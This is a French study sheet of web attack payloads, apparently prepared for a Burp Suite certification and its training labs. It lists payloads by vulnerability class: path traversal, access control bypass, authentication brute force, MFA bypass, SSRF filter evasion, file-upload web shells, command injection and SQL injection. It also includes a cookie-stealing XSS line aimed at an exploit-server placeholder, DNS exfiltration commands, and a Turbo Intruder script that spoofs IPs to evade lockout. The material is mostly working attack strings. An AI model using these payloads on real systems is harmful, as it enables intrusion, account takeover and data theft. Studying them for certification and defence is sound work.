---
tags: [bscp, essentiel, payloads]
statut: en cours
---
# Fiche de payloads par vulnérabilité

### Path traversal ([[Path-traversal]])
- `../../../etc/passwd` — traversal simple (Unix)
- `..\..\..\windows\win.ini` — traversal simple (Windows)
- `....//` ou `....\/` — séquences imbriquées (contournement d'un retrait non récursif de `../`)
- `%2e%2e%2f` — encodage simple
- `%252e%252e%252f` — double encodage
- `..%c0%af` ou `..%ef%bc%8f` — encodage non standard
- `..%252f..%252f..%252fetc/passwd` — double encodage du seul `/` (souvent plus fiable)
- `/etc/passwd` — chemin absolu sans aucune séquence (quand `../` est bloqué)
- `filename=/var/www/images/../../../etc/passwd` — contournement validation de préfixe (chemin absolu)
- `filename=../../../etc/passwd%00.png` — contournement validation d'extension (null byte)
- Fichiers cibles : `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `C:\windows\win.ini`
- Liste Burp Intruder dédiée : **Fuzzing - path traversal**
- Détail : [[Path-traversal-cas-simple]], [[Path-traversal-chemin-absolu]], [[Path-traversal-sequences-et-encodage]], [[Path-traversal-prefixe-et-extension]]

### Access control ([[Access-control]])
- `/admin`, `/administrator-panel-<suffixe>` — accès direct à une fonction non liée dans l'UI
- `/robots.txt`, `/sitemap.xml` — emplacements où chercher une URL sensible divulguée (voir aussi le code JS de l'interface)
- `?admin=true`, `?role=1` — contournement par paramètre de rôle contrôlable côté client
- `?id=123` → `?id=124`, `?id=1` — escalade horizontale / IDOR par manipulation d'identifiant, à tester sous un compte différent
- `GET` / `POST` / `PUT` / `DELETE` sur le même endpoint — ne pas se limiter au verbe HTTP utilisé par l'UI
- `Admin=true` (cookie) — rôle contrôlable côté client
- `"roleid":2` ajouté au corps JSON d'une mise à jour de profil — mass assignment
- `X-Original-URL: /admin` ou `X-Rewrite-URL: /admin` sur `GET /` — contournement d'un blocage d'URL par le front-end (tester d'abord `/invalid`)
- `/ADMIN/deleteUser`, `/admin/deleteUser/`, `/admin/deleteUser.anything` — variantes de chemin
- `Referer: https://site/admin` — contrôle d'accès basé sur le Referer
- `/download-transcript/1.txt` — IDOR sur fichiers statiques (décrémenter le numéro)
- Lire le corps d'une réponse `302` — des données sensibles y fuient parfois
- Détail : [[Access-control-fonctionnalite-non-protegee]], [[Access-control-parametre-utilisateur]], [[Access-control-escalade-horizontale]], [[Access-control-idor]], [[Access-control-contournement-plateforme]], [[Access-control-processus-multi-etapes-et-referer]]

### Authentication ([[Authentication]])
- `admin`, `administrator`, `prenom.nom@domaine` — noms d'utilisateur à tester en priorité
- `Password1!`, `Passw0rd`, `<motclé><année>!` — mutations de mot de passe prévisibles (substitutions leet : `o`→`0`, `a`→`4`, `e`→`3`)
- `X-Forwarded-For: <ip aléatoire>` — contournement de blocage IP (tester aussi `X-Real-IP`, `X-Client-IP`, `True-Client-IP`)
- `Authorization: Basic base64(username:password)` — authentification HTTP Basic
- Cookie `stay-logged-in` = `base64(username:md5(mot de passe))` — payload processing Intruder : Hash MD5, Add prefix `carlos:`, Encode Base64 ; Grep - Match sur un texte de page connectée (`Update email`)
- `<script>document.location='//EXPLOIT-SERVER/'+document.cookie</script>` — vol du cookie persistant via XSS stocké, puis craquage du hash hors ligne
- `"password":["123456","password","qwerty"]` — tableau JSON : tous les candidats dans une seule requête
- Mot de passe très long (100 caractères ou plus) — amplifie la différence de temps de réponse pour énumérer les usernames
- Intruder Cluster bomb avec Null payloads répétés 5 fois — provoquer le verrouillage pour énumérer les comptes
- Alterner `wiener:peter` et `carlos:<candidat>` (Pitchfork, une requête simultanée) — remise à zéro du compteur de blocage
- `X-Forwarded-Host: EXPLOIT-SERVER` sur `POST /forgot-password` — empoisonnement du lien de réinitialisation (tester aussi `X-Forwarded-Server`, `X-Host`)
- Supprimer `temp-forgot-password-token` de l'URL et du corps — token non revalidé
- `username=carlos&current-password=§x§&new-password-1=123&new-password-2=abc` — oracle `New passwords do not match`
- Grep - Extract sur le message d'erreur — différences subtiles (point final manquant)
- Détail : [[Auth-brute-force-identifiants]], [[Auth-contournement-blocage]], [[Auth-http-basic]], [[Auth-maintien-connexion]], [[Auth-reinitialisation-mot-de-passe]], [[Auth-modification-mot-de-passe]]
- Script Turbo Intruder pour bypass de blocage IP (1 seul marqueur position password, IP injectée par remplacement de texte sur `target.req`) :
  ```python
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                              concurrentConnections=1,
                              requestsPerConnection=1,
                              pipeline=False
                              )

      for password in wordlists.clipboard:
          ip = "%d.%d.%d.%d" % (
              randint(1, 255), randint(1, 255), randint(1, 255), randint(1, 255)
          )
          req = target.req.replace("1.1.1.1", ip)
          engine.queue(req, password)


  def handleResponse(req, interesting):
      table.add(req)
  ```

### Multi-factor authentication ([[Multi-factor-authentication]])
- `Cookie: account=carlos` → `Cookie: account=victim-user` — manipulation du cookie de liaison d'identité entre étapes
- `0000`-`9999` ou `000000`-`999999` — brute force du code de vérification (Burp Intruder, attaque Sniper, payload type Numbers)
- `"verified":false` → `"verified":true` — réponse de vérification à surveiller/manipuler si la décision est côté client
- `/my-account` — accès direct après l'étape 1, en forçant la navigation vers une URL post-connexion sans jamais soumettre le code
- `GET /login2` avec `Cookie: verify=carlos` — génère un code pour la victime ; puis `POST /login2` avec `verify=carlos` et brute force de `mfa-code`
- Macro Burp (`GET /login`, `POST /login`, `GET /login2`) + règle de gestion de session + une requête simultanée — brute force quand la session est coupée après deux échecs
- Détail : [[MFA-acces-direct]], [[MFA-logique-defaillante]], [[MFA-brute-force-code]], [[MFA-reponse-et-secours]]

### SSRF ([[SSRF]])
- `stockApi=http://localhost/admin` — serveur local
- `stockApi=http://192.168.0.1:8080/admin` — système back-end ; position Intruder sur le dernier octet, payload Numbers de 1 à 255, trier par statut
- `http://127.1/`, `http://2130706433/`, `http://017700000001/`, `http://0x7f000001/`, `http://[::1]/` — représentations alternatives de `127.0.0.1` (liste noire)
- `http://127.1/%2561dmin` — double encodage d'une lettre du chemin bloqué
- `http://spoofed.burpcollaborator.net` — nom de domaine qui résout vers `127.0.0.1`
- `https://expected-host:fakepassword@evil-host` — identifiants avant l'hôte (liste blanche)
- `https://evil-host#expected-host` — fragment (liste blanche)
- `https://expected-host.evil-host` — hiérarchie DNS (liste blanche)
- `http://localhost:80%2523@stock.weliketoshop.net/admin` — `@` plus `#` double-encodé (liste blanche)
- `/product/nextProduct?path=http://192.168.0.12:8080/admin` — redirection ouverte vers l'hôte interne
- `Referer: http://BURP-COLLABORATOR-SUBDOMAIN` — SSRF aveugle via l'analyseur de trafic ; relever Collaborator avec « Poll now »
- `User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` avec `Referer: http://192.168.0.X:8080` — Shellshock en aveugle, balayage du dernier octet
- Hors formation, à garder en tête : `http://169.254.169.254/` (métadonnées cloud), `file://`, `gopher://`
- Détail : [[SSRF-serveur-local]], [[SSRF-systemes-back-end]], [[SSRF-filtre-liste-noire]], [[SSRF-filtre-liste-blanche]], [[SSRF-redirection-ouverte]], [[SSRF-aveugle]], [[SSRF-surfaces-cachees]]

### File upload ([[File-upload]])
- `<?php echo file_get_contents('/home/carlos/secret'); ?>` — web shell minimal de lecture de fichier
- `<?php system($_GET['command']); ?>` — web shell polyvalent ; appel : `GET /files/avatars/exploit.php?command=id`
- `Content-Type: image/jpeg` dans la **partie fichier** du `multipart/form-data` — contournement d'une validation sur le type MIME annoncé
- `GET /files/avatars/<fichier>` dans Repeater, nom remplacé par `exploit.php` — appel du fichier téléversé pour déclencher l'exécution
- Filtre **Images** de **Proxy > HTTP history** — retrouver l'URL de service des fichiers téléversés
- Techniques de contournement d'extension, de configuration et de contenu : à ajouter quand elles seront étudiées
- Détail : [[File-upload-web-shell]], [[File-upload-validation-content-type]], [[File-upload-liste-noire]]

### Command injection ([[Command-injection]])
- `1|whoami` dans `storeID` - injection simple avec sortie visible
- `& echo aiwefwlguh &` - test de détection avec sortie visible ; le second `&` isole la suite de la commande d'origine
- `& ping -c 10 127.0.0.1 &` - détection aveugle par délai (`-n` sous Windows)
- `& whoami > /var/www/static/whoami.txt &` puis `GET /whoami.txt` - redirection de la sortie vers un répertoire web
- ``& nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN &`` - exfiltration out-of-band par DNS
- Séparateurs à essayer : `&`, `&&`, `|`, `||`, `;` et saut de ligne `%0a` (les deux derniers : Unix seulement) ; `` `cmd` `` et `$(cmd)` sur Unix
- Détail : [[Command-injection]]

### SQL injection ([[SQL-injection]])
- `'` - détection : une erreur de base de données ou une réponse anormale indique un point d'injection
- `Gifts'--` - commentaire : supprime la fin de la requête (`AND released = 1`)
- `'+OR+1=1--` - condition toujours vraie : affiche tous les produits, y compris non publiés (prudence si la condition atteint un `UPDATE` ou un `DELETE`)
- `administrator'--` dans `username`, mot de passe vide - contournement de connexion
- Commentaires : `--` (MySQL : suivi d'un espace, soit `--+` en URL), `#` (MySQL, à encoder en `%23` dans une URL)
- Colonnes, méthode `ORDER BY` : `' ORDER BY 1--`, `' ORDER BY 2--`, `' ORDER BY 3--` ... jusqu'à l'erreur ; la dernière valeur sans erreur donne le nombre de colonnes
- Colonnes, méthode `NULL` : `'+UNION+SELECT+NULL--`, `'+UNION+SELECT+NULL,NULL--`, `'+UNION+SELECT+NULL,NULL,NULL--` ... jusqu'à la disparition de l'erreur
- Oracle : `' UNION SELECT NULL FROM DUAL--` - `FROM` obligatoire, table intégrée `DUAL`
- Colonne de type chaîne : `' UNION SELECT 'a',NULL,NULL,NULL--`, puis `NULL,'a',NULL,NULL`, etc. ; en lab, remplacer `'a'` par la valeur aléatoire fournie
- `'+UNION+SELECT+username,+password+FROM+users--` - extraction de la table `users` (deux colonnes de type chaîne)
- `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` - plusieurs valeurs dans une seule colonne (Oracle, PostgreSQL)
- Concaténation selon la base : Oracle et PostgreSQL `'foo'||'bar'`, Microsoft `'foo'+'bar'` (envoyer `%2b` en URL), MySQL `'foo' 'bar'` (espace) ou `CONCAT('foo','bar')`
- Version : `' UNION SELECT @@version,NULL--` (Microsoft), `' UNION SELECT @@version,NULL#` (MySQL), `' UNION SELECT banner,NULL FROM v$version--` (Oracle), `' UNION SELECT version(),NULL--` (PostgreSQL)
- Tables, hors Oracle : `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
- Colonnes, hors Oracle : `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
- Tables, Oracle : `' UNION SELECT table_name,NULL FROM all_tables--`
- Colonnes, Oracle : `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--` (noms en majuscules)
- Catégorie inexistante dans le filtre - isole la ligne injectée du reste des résultats
- Le point d'injection peut aussi être dans le corps de la requête, un cookie ou un en-tête
- Injection aveugle, détection booléenne : `x' AND '1'='1` (message présent) puis `x' AND '1'='2` (message absent) ; numérique : `x AND 1=1` puis `x AND 1=2`
- Aveugle, existence d'une table ou d'un utilisateur : `xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` puis `xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
- Aveugle, longueur du mot de passe : `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` (incrémenter jusqu'à la disparition du signal ; `LEN` sur Microsoft)
- Aveugle, extraction d'un caractère (Intruder, position sur le dernier `a`, Grep - Match sur le message) : `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§` ; `SUBSTR` sur Oracle
- Aveugle, dichotomie sur le code du caractère : `xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109--` (insensible au piège de la casse)
- Erreur conditionnelle, Oracle : `' || (SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '`
- Erreur conditionnelle, Microsoft : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)--`
- Erreur conditionnelle, PostgreSQL : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE 1 END)--`
- Erreur verbeuse, PostgreSQL : `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` (vider la valeur d'origine du cookie si le message est tronqué)
- Erreur verbeuse, PostgreSQL, variante sans le mot `CAST` : `' AND 1=(SELECT username FROM users LIMIT 1)::int-- ` ; signal : `invalid input syntax for type integer: "<valeur>"`
- Erreur verbeuse, MySQL et MariaDB : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)))-- ` ; signal : `XPATH syntax error: '~<valeur>'` ; environ 32 caractères affichés, extraire par tranches avec `SUBSTRING`
- Erreur verbeuse, MySQL et MariaDB, équivalent : `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)),1)-- ` (si `EXTRACTVALUE` est filtré)
- Erreur verbeuse, MySQL, double requête (ancien, version dépendante) : `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- ` ; signal : `Duplicate entry '<valeur>~1' for key 'group_key'`
- Erreur conditionnelle, MySQL (`1/0` ne lève pas d'erreur en lecture) : `' AND IF(cond,(SELECT table_name FROM information_schema.tables),'a')-- ` ; signal : `Subquery returns more than 1 row` quand `cond` est vraie
- Erreur verbeuse, Microsoft : `' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users WHERE username='administrator'))-- ` ; signal : `Conversion failed when converting the nvarchar value '<valeur>' to data type int`
- Erreur verbeuse, Microsoft, version et utilisateur : `' AND 1=CONVERT(int,@@version)-- ` ; `' AND 1=CONVERT(int,SYSTEM_USER)-- ` ; plusieurs lignes : `STRING_AGG(name,',')` (SQL Server 2017 et suivants) ou `FOR XML PATH('')` (versions plus anciennes)
- Erreur verbeuse, Oracle : `' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT password FROM users WHERE username='administrator' AND ROWNUM=1)||CHR(62))) FROM dual)-- ` ; signal : `ORA-31011: XML parsing failed` avec la valeur dans le détail
- Erreur verbeuse, Oracle, selon la version et les droits : `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- ` (signal `ORA-29257: host <valeur> unknown`) ; `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- ` (signal `ORA-20000`, exige Oracle Text)
- Erreur conditionnelle, SQLite (à vérifier selon la version) : `' AND (SELECT CASE WHEN (cond) THEN abs(-9223372036854775808) ELSE 1 END)=1-- ` ; signal : `integer overflow` ; oracle conditionnel uniquement, aucune fuite de valeur
- Reconnaissance du moteur par le message d'erreur : `XPATH syntax error` ou `Subquery returns more than 1 row` pour MySQL, `invalid input syntax for type integer` pour PostgreSQL, `ORA-` pour Oracle, `Conversion failed` ou `Divide by zero error` pour Microsoft
- Seul `TO_CHAR(1/0)` sur Oracle a été rejoué (lab du journal) ; les autres payloads d'erreur sont non rejoués, voir [[Error-based SQL Injection]] pour les limites et les points à vérifier
- Délai simple (10 secondes) : Oracle `'||dbms_pipe.receive_message(('a'),10)--`, Microsoft `'; WAITFOR DELAY '0:0:10'--`, PostgreSQL `'||pg_sleep(10)--`, MySQL `' AND SLEEP(10)-- -`
- Délai conditionnel : Oracle `' || (SELECT CASE WHEN (cond) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--`, Microsoft `'; IF (cond) WAITFOR DELAY '0:0:10'--`, PostgreSQL `'%3BSELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END--` (`;` encodé dans un cookie), MySQL `' AND IF(cond,SLEEP(10),0)-- -`
- Hors bande : Microsoft `'; exec master..xp_dirtree '//COLLAB/a'--`, PostgreSQL `'; copy (SELECT '') to program 'nslookup COLLAB'--` (privilèges élevés), Oracle `UTL_INADDR.get_host_address('COLLAB')` (privilèges élevés) ; `COLLAB` = sous-domaine Burp Collaborator ; exfiltration en plaçant la sous-requête dans le sous-domaine
- Burp Intruder : délais, Resource pool à une requête simultanée ; deux positions (index et caractère), Cluster bomb
- Non rejoués sur une base : les payloads d'erreur, de délai et hors bande sont à vérifier sur les labs correspondants avant de s'y fier
- Détail : [[SQL-injection]], [[SQL-injection-Union-Attacks]], [[Blind-SQL-injection]], [[Error-based SQL Injection]]
